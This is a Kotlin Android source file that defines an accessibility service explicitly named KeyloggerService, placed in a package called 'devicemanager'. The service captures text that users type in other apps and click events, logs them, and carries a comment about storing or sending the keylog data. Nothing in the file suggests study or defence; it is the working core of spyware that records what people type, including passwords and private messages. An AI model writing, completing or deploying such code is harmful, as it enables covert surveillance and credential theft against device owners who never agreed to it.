package com.devicemanager

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.util.Log

class KeyloggerService : AccessibilityService() {

    private val TAG = "KeyloggerService"

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val text = event.text.toString()
                Log.d(TAG, "Text changed: $text")
                // Store or send keylog data
            }
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                val className = event.className.toString()
                Log.d(TAG, "View clicked: $className")
            }
        }
    }

    override fun onInterrupt() {
        Log.d(TAG, "Service interrupted")
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d(TAG, "Service connected")
    }
}
